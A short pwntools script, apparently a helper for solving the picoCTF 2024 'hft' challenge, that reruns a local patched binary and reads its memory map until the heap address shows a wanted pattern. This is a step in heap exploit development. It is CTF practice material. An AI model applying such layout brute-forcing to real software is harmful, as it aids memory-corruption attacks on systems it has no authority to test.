from pwn import *
from tqdm import tqdm 
tries=0 
context.log_level='error'
pbar=tqdm()
while True:
    r=process(['/home/user/ctf/ctf-solutions/picoCTF/2024/hft/hft_patched'])  
    r.sendline(p64(0x10)+b'aaa')
    for _ in range(3): r.recvline()
    output=open(f'/proc/{r.pid}/maps').read()
    r.close()
    tries+=1 
    pbar.update(1)
    for l in output.split('\n'):
        #print(l)
        if 'heap' in l:
            #print(l)
            if l[6:9] == '004':
                print('tries', tries)
                print(l)
                break

